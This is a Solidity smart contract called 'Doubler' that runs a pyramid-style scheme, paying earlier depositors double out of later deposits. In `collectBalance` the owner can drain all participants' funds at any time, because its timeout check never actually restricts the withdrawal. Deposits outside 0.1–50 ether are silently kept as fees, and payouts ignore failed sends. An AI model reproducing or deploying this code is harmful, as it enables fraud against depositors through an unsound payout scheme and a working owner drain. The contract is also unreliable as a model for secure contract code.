1 contract Doubler{
2 
3     struct Participant {
4         address etherAddress;
5         uint PayAmount;
6     }
7 
8     Participant[] public participants;
9 
10     uint public payoutIdx = 0;
11     uint public collectedFees = 0;
12     uint public balance = 0;
13 	uint public timeout = now + 1 weeks;
14 
15     address public owner;
16 
17 
18     // simple single-sig function modifier
19     modifier onlyowner { if (msg.sender == owner) _ }
20 
21     // this function is executed at initialization and sets the owner of the contract
22     function Doubler() {
23 		collectedFees += msg.value;
24         owner = msg.sender;
25     }
26 
27     // fallback function - simple transactions trigger this
28     function() {
29         enter();
30     }
31     
32     function enter() {
33 		//send more than 0.1 ether and less than 50, otherwise loss all
34 		if (msg.value >= 100 finney && msg.value <= 50 ether) {
35 	        // collect fees and update contract balance
36 	        collectedFees += msg.value / 20;
37 	        balance += msg.value - msg.value / 20;
38 	
39 	      	// add a new participant to array and calculate need balance to payout
40 	        uint idx = participants.length;
41 	        participants.length += 1;
42 	        participants[idx].etherAddress = msg.sender;
43 	        participants[idx].PayAmount = 2 * (msg.value - msg.value / 20);
44 			
45 			uint NeedAmount = participants[payoutIdx].PayAmount;
46 			// if there are enough ether on the balance we can pay out to an earlier participant
47 		    if (balance >= NeedAmount) {
48 	            participants[payoutIdx].etherAddress.send(NeedAmount);
49 	
50 	            balance -= NeedAmount;
51 	            payoutIdx += 1;
52 	        }
53 		}
54 		else {
55 			collectedFees += msg.value;
56             return;
57 		}
58     }
59 
60 	function NextPayout() {
61         balance += msg.value;
62 		uint NeedAmount = participants[payoutIdx].PayAmount;
63 
64 	    if (balance >= NeedAmount) {
65             participants[payoutIdx].etherAddress.send(NeedAmount);
66 
67             balance -= NeedAmount;
68             payoutIdx += 1;
69         }
70     }
71 
72     function collectFees() onlyowner {
73 		collectedFees += msg.value;
74         if (collectedFees == 0) return;
75 
76         owner.send(collectedFees);
77         collectedFees = 0;
78     }
79 
80     function collectBalance() onlyowner {
81 		balance += msg.value;
82         if (balance == 0 && now > timeout) return;
83 
84         owner.send(balance);
85         balance = 0;
86     }
87 
88     function setOwner(address _owner) onlyowner {
89 		collectedFees += msg.value;
90         owner = _owner;
91     }
92 }